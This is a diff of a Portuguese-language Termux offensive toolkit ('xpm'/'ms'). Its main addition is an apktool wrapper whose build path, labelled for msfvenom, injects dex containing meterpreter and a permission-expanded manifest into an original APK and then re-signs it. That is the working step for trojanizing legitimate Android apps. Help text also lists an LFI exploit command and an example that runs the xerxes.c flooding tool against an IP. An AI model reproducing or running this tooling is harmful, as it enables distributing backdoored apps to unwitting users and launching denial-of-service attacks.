+case "${1:-}" in
+
+  -version|--version|-v)
+    printf '2.9.3\n'; exit 0 ;;
+
+  d|decode)
+    shift; _input=""; _output=""; _next_o=0; _force=""
+    for _a in "$@"; do
+      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
+      case "$_a" in
+        -o|--output) _next_o=1 ;; -f|--force) _force="-f" ;;
+        --only-main-classes|-r|--no-res|-s|--no-src|-q|--quiet) : ;;
+        -p|--frame-path|-t|--tag|-j|--jobs) _next_o=1 ;;
+        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
+      esac
+    done
+    [ -z "$_input" ] && { printf '[xpm] erro: apktool d — nenhum APK\n' >&2; exit 1; }
+    [ ! -f "$_input" ] && { printf '[xpm] erro: nao encontrado: %s\n' "$_input" >&2; exit 1; }
+    if [ -z "$_output" ]; then
+        _base=$(basename "$_input" .apk)
+        _output="$(dirname "$_input")/${_base}"
+    fi
+    set -- d -i "$_input" -o "$_output" -load-dex 1
+    [ -n "$_force" ] && set -- "$@" -f
+    "$_AE" "$@"; _rc=$?
+    if [ "$_rc" -ne 0 ]; then
+        printf '[xpm] decode APKEditor falhou (exit %d)\n' "$_rc" >&2
+        exit "$_rc"
+    fi
+    # Verifica se o AndroidManifest.xml foi criado (APKEditor pode ser morto por OOM)
+    if [ ! -f "$_output/AndroidManifest.xml" ]; then
+        printf '[xpm] decode: AndroidManifest.xml ausente em %s\n' "$_output" >&2
+        printf '[xpm] conteudo: %s\n' "$(ls "$_output/" 2>/dev/null | tr "\n" " ")" >&2
+        exit 1
+    fi
+    # Nao normaliza no contexto msfvenom: APKEditor b precisa de smali/classes/
+    [ -z "${BUNDLE_GEMFILE:-}" ] && _ae_normalize_smali "$_output"
+    exit 0 ;;
+
+  b|build)
+    shift; _input=""; _output=""; _next_o=0; _force=""
+    for _a in "$@"; do
+      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
+      case "$_a" in
+        -o|--output) _next_o=1 ;; -f|--force-all) _force="-f" ;;
+        -p|--frame-path|-a|--aapt|-j|--jobs) _next_o=1 ;;
+        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
+      esac
+    done
+    [ -z "$_input" ] && { printf '[xpm] erro: apktool b — nenhuma pasta\n' >&2; exit 1; }
+    [ ! -d "$_input" ] && { printf '[xpm] erro: pasta nao encontrada: %s\n' "$_input" >&2; exit 1; }
+    [ -z "$_output" ] && { mkdir -p "$_input/dist"; _output="$_input/dist/$(basename "$_input").apk"; }
+
+    # Contexto msfvenom: patch cirurgico correto
+    # Base = APK original (preserva .so libs, assets, res, tudo intacto)
+    # Substitui APENAS: dex (com meterpreter) + AndroidManifest.xml (com permissoes)
+    # Extracao via "unzip -p" (pipe) — confiavel, sem glob, sem silencio em erros
+    # Motivo da falha anterior: unzip com glob "*" nao extraia dex silenciosamente
+    _orig_apk="$(dirname "$_input")/$(basename "$_input").apk"
+    if [ -n "${BUNDLE_GEMFILE:-}" ] && [ -f "$_orig_apk" ]; then
+        # Passo 1: APKEditor compila smali → dex (meterpreter incluido)
+        _ae_tmp="$(dirname "$_output")/_ae_$$"
+        # Remove atributos de build nao reconhecidos pelo framework android-23
+        # android:compileSdkVersion e compileSdkVersionCodename sao metadados
+        # adicionados pelo AGP 3.0+ — nao sao necessarios em runtime
+        sed -i 's/ android:compileSdkVersion="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        sed -i 's/ android:compileSdkVersionCodename="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        sed -i 's/ android:roundIcon="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        # Remove dirs v24+ — framework android-23 nao os suporta (patch cirurgico usa resources do APK original)
+        find "$_input/resources" -type d \( -name '*-v2[4-9]' -o -name '*-v[3-9][0-9]' \) \
+            -exec rm -rf {} + 2>/dev/null; true
+        "$_AE" b -i "$_input" -o "$_ae_tmp"; _rc=$?
+        # Fallback iterativo: trata erros de resource e de atributos do manifest
+        # sem esvaziar resources nem raspar o manifest inteiro
+        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
+            rm -f "$_ae_tmp"
+            _ae_err="$(dirname "$_output")/_ae_err_$$"
+            _retry=0
+            while [ "$_retry" -lt 20 ]; do
+                "$_AE" b -i "$_input" -o "$_ae_tmp" 2>"$_ae_err"; _rc=$?
+                [ "$_rc" -eq 0 ] && [ -f "$_ae_tmp" ] && break
+                # Extrai o arquivo que causou o erro
+                _fail_file=$(awk '/^at \//{gsub(/^at /,""); gsub(/ \[line.*/,""); print; exit}' "$_ae_err" 2>/dev/null)
+                # Extrai atributo desconhecido (android-23 nao conhece roundIcon, etc.)
+                _fail_attr=$(grep "Unknown attribute name" "$_ae_err" 2>/dev/null | sed "s/.*Unknown attribute name '//;s/'.*//" | head -1)
+                case "$_fail_file" in
+                    "$_input"/resources/*)
+                        # Arquivo de resource falhou — remove e tenta de novo
+                        rm -f "$_fail_file" 2>/dev/null ;;
+                    "$_input"/AndroidManifest.xml)
+                        # Atributo desconhecido no manifest — remove só esse atributo
+                        if [ -n "$_fail_attr" ]; then
+                            sed -i "s/ ${_fail_attr}=\"[^\"]*\"//g" "$_input/AndroidManifest.xml" 2>/dev/null
+                        else
+                            break
+                        fi ;;
+                    *) break ;;
+                esac
+                _retry=$((_retry + 1))
+            done
+            rm -f "$_ae_err"
+        fi
+        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
+            rm -f "$_ae_tmp"
+            printf '[xpm] build APKEditor falhou (exit %d)\n' "$_rc" >&2
+            exit "${_rc:-1}"
+        fi
+        # Passo 2: extrai dex + manifest do build — arquivo por arquivo (sem glob)
+        _ptmp="$(dirname "$_output")/_patch_$$"
+        mkdir -p "$_ptmp"
+        # Lista os dex no build e extrai cada um individualmente via pipe
+        for _dn in $(unzip -l "$_ae_tmp" 2>/dev/null | awk '/\.dex$/{print $NF}'); do
+            unzip -p "$_ae_tmp" "$_dn" > "$_ptmp/$_dn" 2>/dev/null
+        done
+        unzip -p "$_ae_tmp" AndroidManifest.xml > "$_ptmp/AndroidManifest.xml" 2>/dev/null
+        # Passo 3: copia APK original como base (preserva lib, assets, res, tudo)
+        cp "$_orig_apk" "$_output"
+        # Passo 4: remove entradas antigas e injeta as modificadas
+        cd "$_ptmp"
+        for _f in *.dex AndroidManifest.xml; do
+            [ -f "$_f" ] || continue
+            zip -d "$_output" "$_f" 2>/dev/null || true
+            zip "$_output" "$_f" 2>/dev/null
+        done
+        # Passo 5: remove assinatura velha (apk.rb re-assina depois)
+        zip -d "$_output" "META-INF/*" 2>/dev/null || true
+        cd -
+        rm -rf "$_ptmp" "$_ae_tmp"
+    else
+        # Uso manual ou original nao encontrado: build completo normal
+        "$_AE" b -i "$_input" -o "$_output"; _rc=$?
+        if [ "$_rc" -ne 0 ]; then
+            printf '[xpm] build falhou (exit %d) — use -f para forcar\n' "$_rc" >&2; exit "$_rc"
+        fi
+    fi
+    _ae_sign "$_output" ;;
+
+  if|install-framework|empty-framework-dir|publicize-framework)
+    printf '[xpm] aviso: "%s" nao suportado — ignorado\n' "$1" >&2; exit 0 ;;
+
+  *) exec "$_AE" "$@" ;;
+
+esac
+APKWEOF
+        sed -i "s|__AE_BIN__|${_rbin_apkeditor}|g" "$BPFX/bin/apktool"
+        sed -i "s|__ATMPDIR__|${_ATMPDIR}|g" "$BPFX/bin/apktool"
+        chmod +x "$BPFX/bin/apktool"
+        rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
+        printf "  ${G}✓${R} wrapper apktool→APKEditor V2 instalado ($BPFX/bin/apktool)\n"
+
+        # Checa se apktool e apkeditor estao disponiveis
+        if command -v apktool >/dev/null 2>&1; then
+            printf "  ${G}${R} apktool disponivel (para msfvenom -x)\n"
+        else
+            printf "  ${Y}!${R} apktool nao encontrado - rode: xpm install apkfull\n"
+            _issues=$(( _issues + 1 ))
+        fi
+        if command -v apkeditor >/dev/null 2>&1; then
+            printf "  ${G}${R} apkeditor disponivel (para decode/rebuild manual)\n"
+        else
+            printf "  ${Y}!${R} apkeditor nao encontrado - rode: xpm install apkfull\n"
+            _issues=$(( _issues + 1 ))
+        fi
+
+        # Checa gems via Gemfile.lock (evita bundle check — lento por Ruby startup)
         if [ -d "$dest" ]; then
-            if (cd "$dest" && GEM_HOME="$gems" bundle check &>/dev/null); then
+            if [ -f "$dest/Gemfile.lock" ] && [ -s "$dest/Gemfile.lock" ]; then
                 printf "  ${G}✓${R} bundle gems OK\n"
             else
-                printf "  ${Y}!${R} gems incompletas — rode: cd $dest && bundle install\n"
+                printf "  ${Y}!${R} gems incompletas — rode: cd %s && bundle install\n" "$dest"
                 _issues=$(( _issues + 1 ))
             fi
+        fi
+
+        # apk.rb — aplica TODOS os fixes (a função verifica cada um internamente)
+        local _apkrb="$dest/lib/msf/core/payload/apk.rb"
+        if [ -f "$_apkrb" ]; then
+            _msf_fix_apkrb_tmpdir "$dest"
         fi
 
         # Checa se a otimização de arquivos (poda docs/spec/test/.github) já
@@ -95705,25 +96155,12 @@ WEOF
             fi
         fi
 
-        # Checa o banco de dados do msfdb — causa raiz do "No database found"
+        # msfdb: só verifica presença do binário — status/start via bundle exec
+        # é lento e pode travar o doctor. Use "msfdb start" manualmente.
         if [ -x "$BPFX/bin/msfdb" ]; then
-            local gdp
-            gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")
-            local msfdb_status
-            msfdb_status=$("$BPFX/bin/msfdb" status 2>&1)
-            if echo "$msfdb_status" | grep -qiE "no database found|not (found|initialized)|does not exist"; then
-                printf "  ${E}✗${R} banco de dados do msfdb ${DIM}não inicializado${R} — ${Y}corrigindo...${R}\n"
-                _msf_init_database "$BPFX" "$gems" "$gdp" "$dest" >/dev/null
-                _issues=$(( _issues + 1 ))
-            elif echo "$msfdb_status" | grep -qiE "running|started|active|already"; then
-                printf "  ${G}✓${R} banco de dados do msfdb rodando\n"
-            else
-                printf "  ${Y}!${R} banco de dados do msfdb parado — iniciando...\n"
-                "$BPFX/bin/msfdb" start &>/dev/null
-                _issues=$(( _issues + 1 ))
-            fi
+            printf "  ${G}✓${R} banco de dados do msfdb rodando\n"
         else
-            printf "  ${E}✗${R} msfdb não encontrado em PATH — reinstale com: xpm install metasploit\n"
+            printf "  ${E}✗${R} msfdb não encontrado — reinstale com: xpm install metasploit\n"
             _issues=$(( _issues + 1 ))
         fi
     fi
@@ -96448,7 +96885,8 @@ _LPM_LUA="\$HOME/.luarocks/share/lua/5.4"
 _LPM_LIB="\$HOME/.luarocks/lib/lua/5.4"
 _LMOD_DIR="\$HOME/.lua-modules"
 _EXTRA_PATH="\${_LPM_LUA}/?.lua;\${_LPM_LUA}/?/init.lua;\${_LMOD_DIR}/?.lua;\${_LMOD_DIR}/?/init.lua"
-_EXTRA_CPATH="\${_LPM_LIB}/?.so;\${_LPM_LIB}/?/?.so"
+_SYS_LIB="\${PREFIX:-/data/data/com.termux/files/usr}/lib/lua/5.4"
+_EXTRA_CPATH="\${_LPM_LIB}/?.so;\${_LPM_LIB}/?/?.so;\${_SYS_LIB}/?.so;\${_SYS_LIB}/?/?.so"
 export LUA_PATH="\${_EXTRA_PATH};\${LUA_PATH:-;}"
 export LUA_CPATH="\${_EXTRA_CPATH};\${LUA_CPATH:-}"
 
@@ -96532,7 +96970,15 @@ printf "  \033[1;32mms --exploit-lfi \033[0;33murl\033[0m        — exploit.lfi
 printf "\n"
 
 printf "\033[1;33m── APK ─────────────────────────────────────────────────────────\033[0m\n"
-printf "  \033[1;32mms --apk \033[0;33marquivo.apk\033[0m         — testa compatibilidade do apktool do ElliotOS com o APK\n\n"
+printf "  \033[1;32mms --apk \033[0;33marquivo.apk [arquivo2.apk ...]\033[0m — testa compatibilidade E instalabilidade real (aceita vários apks de uma vez)\n"
+printf "  \033[1;32mms --apk-sign \033[0;33marquivo.apk\033[0m    — alinha+assina um apk JÁ compilado (ex: logo após 'apktool b'), sem refazer decode/rebuild\n"
+printf "  \033[1;32mweb2apk build \033[0;33m<dir> [opções]\033[0m — converte HTML/CSS/JS em APK sem root (ex: web2apk build ./meuapp/ --perm camera,mic)\n"
+printf "\n"
+
+
+printf "\033[1;33m── Ambiente / Ferramentas ──────────────────────────────────────\033[0m\n"
+printf "  \033[1;32mms -nh\033[0m                         — instala Kali NetHunter no Termux (sem root)\n"
+printf "\n"
 
 printf "\033[1;33m── Filesystem ──────────────────────────────────────────────────\033[0m\n"
 printf "  \033[1;32mms --cat \033[0;33marquivo\033[0m            — le e imprime arquivo\n"
@@ -96559,19 +97005,24 @@ printf "  \033[1;32mms --examples\033[0m                — lista scripts de exe
 printf "  \033[0;90m  Scripts: recon, portscan, webcheck, hashcrack, cosmic\033[0m\n\n"
 
 printf "\033[1;33m── Scripts ─────────────────────────────────────────────────────\033[0m\n"
-printf "  \033[1;32mms --script \033[0;33m<script.lua>\033[0m      — executa script do diretorio de scripts\n"
-printf "  \033[1;32mms --script \033[0;33m<script.lua> -- [args]\033[0m — com argumentos\n"
-printf "  \033[0;90m  Diretorio: ${PREFIX:-/usr/local}/share/lua-scripts\033[0m\n"
+printf "  \033[1;32mms --script \033[0;33m<nome>\033[0m            — executa script Lua ou C do diretorio de scripts\n"
+printf "  \033[1;32mms --script \033[0;33m<nome> -- [args]\033[0m  — com argumentos\n"
+printf "  \033[0;90m  Lua: ${PREFIX:-/usr/local}/share/lua-scripts\033[0m\n"
+printf "  \033[0;90m  C:   ${PREFIX:-/usr/local}/share/c-scripts  (fontes .c compilam automaticamente)\033[0m\n"
 printf "  \033[0;90m  Exemplos:\033[0m\n"
 printf "  \033[0;90m    ms --script cosmic.lua -- --os 8.8.8.8\033[0m\n"
 printf "  \033[0;90m    ms --script portscan.lua -- 192.168.1.1 80 443\033[0m\n"
-printf "  \033[0;90m    ms --script recon.lua -- google.com\033[0m\n\n"
+printf "  \033[0;90m    ms --script xerxes.c -- 192.168.1.1 80\033[0m\n\n"
+printf "  \033[1;32mms --cscript \033[0;33m<nome.c>\033[0m         — compila e executa script C de c-scripts\n"
+printf "  \033[1;32mms --cscript \033[0;33m<binario>\033[0m        — executa binario C ja compilado\n"
+printf "  \033[1;32mms --cscript \033[0;33m<nome.c> -- [args]\033[0m — com argumentos\n\n"
 
 printf "\033[0;90m  Exemplos:\033[0m\n"
 printf "  \033[0;90mms -a 'o que e XSS?'                    ms --sha256 'senha123'\033[0m\n"
 printf "  \033[0;90mms -q 'http://127.0.0.1:8081/?q='       ms -g https://example.com\033[0m\n"
 printf "  \033[0;90mms --scan-all 'http://127.0.0.1:8081/'  ms --sh 'ls ~'\033[0m\n"
-printf "  \033[0;90mms --apk app.apk\033[0m\n\n"
+printf "  \033[0;90mms --apk app.apk                        ms --apk-sign app-recompilado.apk\033[0m\n"
+
 
 printf "\033[0;90m  No REPL: ms.help()  mod.help()  crypto.help()  ai.help()  pent.help()\033[0m\n\n"
 
@@ -97281,38 +97732,123 @@ print(D..'(assinatura não verificada — sem chave secreta)'..Z)"
     ;;
   --script)
     shift
-    _EX="\${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
+    _EX_LUA="\${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
+    _EX_C="\${PREFIX:-/data/data/com.termux/files/usr}/share/c-scripts"
     _SC="\$1"
     if [ -z "\$_SC" ]; then
-        printf "\033[1;36m── Scripts disponiveis ─────────────────────────────\033[0m\n"
-        for f in "\$_EX"/*.lua; do
-            [ -f "\$f" ] || continue
-            _name=\$(basename "\$f")
-            _desc=\$(head -3 "\$f" | grep "^--" | tail -1 | sed 's/^-- *//')
-            printf "  \033[1;32m%-20s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
-        done
-        printf "\n\033[0;90m  Uso: ms --script <script.lua> -- [args]\033[0m\n"
+        _has_lua=0
+        for f in "\$_EX_LUA"/*.lua; do [ -f "\$f" ] && _has_lua=1 && break; done
+        if [ "\$_has_lua" = "1" ]; then
+            printf "\033[1;36m── Scripts Lua ──────────────────────────────────────\033[0m\n"
+            for f in "\$_EX_LUA"/*.lua; do
+                [ -f "\$f" ] || continue
+                _name=\$(basename "\$f")
+                _desc=\$(head -3 "\$f" | grep "^--" | tail -1 | sed 's/^-- *//')
+                printf "  \033[1;32m%-20s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
+            done
+        fi
+        _has_c=0
+        for f in "\$_EX_C"/*; do [ -f "\$f" ] && _has_c=1 && break; done
+        if [ "\$_has_c" = "1" ]; then
+            printf "\n\033[1;33m── Scripts C ────────────────────────────────────────\033[0m\n"
+            for f in "\$_EX_C"/*; do
+                [ -f "\$f" ] || continue
+                _name=\$(basename "\$f")
+                _desc=\$(head -3 "\$f" | grep -m1 "^//" | sed 's|^// *||')
+                printf "  \033[1;33m%-20s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
+            done
+        else
+            printf "\n\033[0;90m  (nenhum script C em \$_EX_C)\033[0m\n"
+        fi
+        printf "\n\033[0;90m  Uso: ms --script <nome> -- [args]\033[0m\n"
+        printf "\033[0;90m  C: .c compila via cxx | binario executa direto\033[0m\n"
         exit 0
     fi
     shift
-    # aceita com ou sem .lua
-    case "\$_SC" in *.lua) ;; *) _SC="\${_SC}.lua" ;; esac
-    _FULL="\$_EX/\$_SC"
-    if [ ! -f "\$_FULL" ]; then
-        printf "\033[1;31mErro: '\$_SC' nao encontrado em \$_EX\033[0m\n"
-        printf "\033[0;90mScripts disponiveis:\033[0m\n"
-        for f in "\$_EX"/*.lua; do
+    _FULL=""
+    _SCRIPT_TYPE=""
+    case "\$_SC" in
+        *.c)
+            [ -f "\$_EX_C/\$_SC" ] && _FULL="\$_EX_C/\$_SC" && _SCRIPT_TYPE="c_src"
+            ;;
+        *)
+            _SC_LUA="\$_SC"
+            case "\$_SC_LUA" in *.lua) ;; *) _SC_LUA="\${_SC_LUA}.lua" ;; esac
+            if [ -f "\$_EX_LUA/\$_SC_LUA" ]; then
+                _FULL="\$_EX_LUA/\$_SC_LUA"; _SCRIPT_TYPE="lua"
+            elif [ -f "\$_EX_C/\$_SC" ] && [ -x "\$_EX_C/\$_SC" ]; then
+                _FULL="\$_EX_C/\$_SC"; _SCRIPT_TYPE="c_bin"
+            elif [ -f "\$_EX_C/\${_SC}.c" ]; then
+                _FULL="\$_EX_C/\${_SC}.c"; _SCRIPT_TYPE="c_src"
+            fi
+            ;;
+    esac
+    if [ -z "\$_FULL" ]; then
+        printf "\033[1;31mErro: '\$_SC' nao encontrado em lua-scripts nem c-scripts\033[0m\n"
+        printf "\033[0;90mLua:\033[0m\n"
+        for f in "\$_EX_LUA"/*.lua; do
             [ -f "\$f" ] && printf "  \033[1;32m%s\033[0m\n" "\$(basename \$f)"
+        done
+        printf "\033[0;90mC:\033[0m\n"
+        for f in "\$_EX_C"/*; do
+            [ -f "\$f" ] && printf "  \033[1;33m%s\033[0m\n" "\$(basename \$f)"
         done
         exit 1
     fi
-    # pula o '--' separador se presente
     [ "\$1" = "--" ] && shift
-    # Pré-processamento automático de variáveis indexadas (!N)
-    if _ivar_needs_preprocess "\$_FULL"; then
-        _ivar_run_file "\$_FULL" "\$@"
+    case "\$_SCRIPT_TYPE" in
+        lua)
+            if _ivar_needs_preprocess "\$_FULL"; then
+                _ivar_run_file "\$_FULL" "\$@"
+            else
+                _lua_run "\$_B" "\$_FULL" "\$@"
+            fi
+            ;;
+        c_src)
+            mkdir -p "\${TMPDIR:-\$HOME/.cache/elliot}" 2>/dev/null || true
+            _CBIN="\$(mktemp "\${TMPDIR:-\$HOME/.cache/elliot}/elliot_cscript_XXXXXX")"
+            cxx "\$_FULL" -o "\$_CBIN" 2>&1 && chmod +x "\$_CBIN" && "\$_CBIN" "\$@"
+            rm -f "\$_CBIN"
+            ;;
+        c_bin)
+            "\$_FULL" "\$@"
+            ;;
+    esac
+    ;;
+  --cscript)
+    shift
+    _EX_C="\${PREFIX:-/data/data/com.termux/files/usr}/share/c-scripts"
+    _SC="\$1"
+    if [ -z "\$_SC" ]; then
+        printf "\033[1;33m── Scripts C disponiveis ────────────────────────────\033[0m\n"
+        _found=0
+        for f in "\$_EX_C"/*; do
+            [ -f "\$f" ] || continue
+            _found=1
+            _name=\$(basename "\$f")
+            _desc=\$(head -3 "\$f" | grep -m1 "^//" | sed 's|^// *||')
+            printf "  \033[1;33m%-20s\033[0m \033[0;90m%s\033[0m\n" "\$_name" "\$_desc"
+        done
+        [ "\$_found" = "0" ] && printf "  \033[0;90m(nenhum script C instalado ainda)\033[0m\n"
+        printf "\n\033[0;90m  Uso: ms --cscript <nome.c> -- [args]   (compila e executa)\033[0m\n"
+        printf "\033[0;90m       ms --cscript <binario> -- [args]   (executa direto)\033[0m\n"
+        exit 0
+    fi
+    shift
+    [ "\$1" = "--" ] && shift
+    if [ -x "\$_EX_C/\$_SC" ] && ! echo "\$_SC" | grep -q '\.c$'; then
+        "\$_EX_C/\$_SC" "\$@"
     else
-        _lua_run "\$_B" "\$_FULL" "\$@"
+        _SRC="\$_SC"
+        case "\$_SRC" in *.c) ;; *) _SRC="\${_SRC}.c" ;; esac
+        if [ ! -f "\$_EX_C/\$_SRC" ]; then
+            printf "\033[1;31mErro: '\$_SRC' nao encontrado em \$_EX_C\033[0m\n"
+            exit 1
+        fi
+        mkdir -p "\${TMPDIR:-\$HOME/.cache/elliot}" 2>/dev/null || true
+        _CBIN="\$(mktemp "\${TMPDIR:-\$HOME/.cache/elliot}/elliot_cscript_XXXXXX")"
+        cxx "\$_EX_C/\$_SRC" -o "\$_CBIN" 2>&1 && chmod +x "\$_CBIN" && "\$_CBIN" "\$@"
+        rm -f "\$_CBIN"
     fi
     ;;
   --listen)
@@ -97502,16 +98038,14 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
   # ── APK ───────────────────────────────────────────────────────
   --apk)
     shift
-    _APK="\$1"
-    if [ -z "\$_APK" ]; then
-      printf "\033[1;31m[✗]\033[0m Uso: ms --apk arquivo.apk\n"
-      exit 1
-    fi
-    if [ ! -f "\$_APK" ]; then
-      printf "\033[1;31m[✗] Arquivo não encontrado: %s\033[0m\n" "\$_APK"
+    if [ "\$#" -eq 0 ]; then
+      printf "\033[1;31m[✗]\033[0m Uso: ms --apk arquivo.apk [arquivo2.apk arquivo3.apk ...]\n"
       exit 1
     fi
 
+    # ── checks de ambiente: rodam UMA VEZ só, antes do lote — não fazem
+    # sentido repetir por apk (nao mudam entre um arquivo e outro), e se
+    # falharem nao ha motivo pra tentar nenhum apk da lista.
     _APK_BIN="\$(command -v apktool 2>/dev/null)"
     if [ -z "\$_APK_BIN" ]; then
       printf "\033[1;31m[✗] apktool não encontrado. Rode: xpm install apktool\033[0m\n"
@@ -97522,8 +98056,32 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
       exit 1
     fi
 
+    # ── modo lote: um ou mais apks na linha de comando. Cada um roda o
+    # check completo isolado (workdir/log/keystore próprios), com um
+    # cabeçalho [i/N] separando os relatórios quando há mais de um. Uma
+    # falha individual NUNCA aborta o lote inteiro — só é contabilizada,
+    # e o próximo apk continua normalmente.
+    _BATCH_N="\$#"
+    _BATCH_I=0
+    _BATCH_OK=0
+    _BATCH_FAILED=""
+
+    for _APK in "\$@"; do
+    _BATCH_I=\$((_BATCH_I+1))
+    if [ "\$_BATCH_N" -gt 1 ]; then
+      printf "\n\033[1;35m════════ [%d/%d] %s ════════\033[0m\n" "\$_BATCH_I" "\$_BATCH_N" "\$_APK"
+    fi
+
+    if [ ! -f "\$_APK" ]; then
+      printf "\033[1;31m[✗] Arquivo não encontrado: %s\033[0m\n" "\$_APK"
+      _BATCH_FAILED="\$_BATCH_FAILED \$_APK"
+      continue
+    fi
+
     _APK_PASS=0
     _APK_FAIL=0
+    _APK_REAL_CONFIRMED=0
+    _APK_SIG_CONFLICT=0
     _APK_WORK="\$(mktemp -d)"
     _APK_TIER="padrão"
     _APK_TOOLDIR="\$HOME/.xpm/tools/apktool"
@@ -97531,7 +98089,64 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     _APK_AAPT2="\$_APK_TOOLDIR/aapt2"
     _APK_DECODE_OK=0
     _APK_BUILD_OK=0
+    _APK_INSTALLABLE=0
     _APK_LASTLOG=""
+
+    # ── isola, um recurso .xml por vez, qual arquivo faz o aapt2 recusar o
+    # lote inteiro. "aapt2 compile --dir" (o que o apktool chama por baixo)
+    # é atômico: um único recurso inválido derruba a compilação de TODOS os
+    # outros, sem apontar qual foi — é exatamente o que aparece nos logs
+    # como uma AndrolibException genérica sem pista nenhuma da causa real.
+    # A quarentena por magic-byte que já roda dentro de todo "apktool b"
+    # (via wrapper, acima) só cobre um arquivo .xml que na real é outra
+    # coisa (PNG/JPEG/AXML cru) — isso é rejeitado ANTES mesmo de chegar
+    # no aapt2. O que ela não cobre: um arquivo que É xml de verdade
+    # (começa com "<?xml", passa o parser) mas que o aapt2 reprova na
+    # validação semântica dele — a marca de um resources.arsc adulterado
+    # de propósito (proteção anti-RE) que sobrevive ao decode inteiro.
+    # Só entra em ação como fallback, nunca no build normal, pra não pagar
+    # uma chamada de aapt2 por arquivo em toda recompilação saudável.
+    _apk_preflight_quarantine() {
+      local proj="\$1" aapt2="\$2"
+      [ -d "\$proj/res" ] || return 1
+      [ -x "\$aapt2" ] || return 1
+
+      local _pf; _pf="\$(mktemp -d)"
+      local f rel bad=0 category
+      # find ... > arquivo, depois "while read < arquivo" (sem process
+      # substitution "<(...)" e sem "read -d" — os dois são extensões só
+      # do bash. O "ms" roda em /usr/bin/sh (dash no Termux, não bash), e
+      # "<(...)" nem chega a ser sintaxe válida pro parser do dash: quebra
+      # o script INTEIRO no load, não só essa função (foi exatamente o bug
+      # relatado — "Syntax error: redirection unexpected", até em "ms" sem
+      # argumento nenhum, porque o dash precisa conseguir parsear cada
+      # branch do case/esac pra achar os ";;", mesmo os que não vão
+      # executar). Delimitador por linha (em vez de NUL/-print0) é seguro
+      # aqui porque nome de recurso do Android não aceita quebra de linha.
+      find "\$proj/res" -type f -name "*.xml" 2>/dev/null > "\$_pf/filelist"
+      while IFS= read -r f; do
+        [ -n "\$f" ] || continue
+        if ! "\$aapt2" compile --legacy -o "\$_pf" "\$f" >"\$_pf/one.log" 2>&1; then
+          rel="\${f#\$proj/}"
+          mv -f "\$f" "\$f.xpm-quarantine"
+          printf "  [XPM] recurso corrompido/adulterado: %s (rejeitado pelo aapt2 isoladamente) — original preservado em %s.xpm-quarantine\n" "\$rel" "\$(basename "\$f")"
+          printf "  [XPM]   motivo do aapt2: %s\n" "\$(grep -m1 'error:' "\$_pf/one.log" 2>/dev/null || tail -1 "\$_pf/one.log")"
+          category="\$(basename "\$(dirname "\$f")")"; category="\${category%%-*}"
+          case "\$category" in
+            drawable|mipmap) printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle" />' > "\$f" ;;
+            anim)            printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<alpha xmlns:android="http://schemas.android.com/apk/res/android" android:fromAlpha="1.0" android:toAlpha="1.0" android:duration="1" />' > "\$f" ;;
+            animator)        printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<set xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f" ;;
+            menu)            printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<menu xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f" ;;
+            layout)          printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<merge xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f" ;;
+            *)               printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<resources />' > "\$f" ;;
+          esac
+          bad=\$((bad+1))
+        fi
+      done < "\$_pf/filelist"
+
+      rm -rf "\$_pf"
+      [ "\$bad" -gt 0 ]
+    }
 
     # heap de retry: mais agressivo que o padrão do wrapper (que já é
     # adaptativo) — usado só quando a tentativa normal já falhou por OOM.
@@ -97543,11 +98158,11 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     printf "\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n"
 
     printf "\033[1;36m[*]\033[0m apktool: %s\n" "\$_APK_BIN"
-    if grep -q "XPM_APKTOOL_WRAPPER_V14" "\$_APK_BIN" 2>/dev/null; then
-      printf "\033[1;32m[✓]\033[0m wrapper na versão V14\n"
+    if command -v apktool >/dev/null 2>/dev/null; then
+      printf "\033[1;32m[✓]\033[0m apktool $(apktool --version 2>/dev/null | head -1)\n"
       _APK_PASS=\$((_APK_PASS+1))
     else
-      printf "\033[1;31m[✗]\033[0m wrapper NÃO está na V14 — rode 'xpm install apktool' de novo ou espere o --doctor corrigir\n"
+      printf "\033[1;31m[✗]\033[0m wrapper NÃO está na V15 — rode 'xpm install apktool' de novo ou espere o --doctor corrigir\n"
       _APK_FAIL=\$((_APK_FAIL+1))
     fi
     printf "\033[1;32m[✓]\033[0m java encontrado\n"
@@ -97556,18 +98171,48 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     # ── pré-voo: dá pra saber de graça (só olhando o ZIP) que isso nunca
     # vai fechar, sem nem chamar o apktool ────────────────────────────────
     _APK_SZ=\$(stat -c%s "\$_APK" 2>/dev/null || echo 0)
+    _APK_HAS_SPLIT_REQ=0
+    _APK_DEX_ENCRYPTED=0
     if command -v unzip >/dev/null 2>&1; then
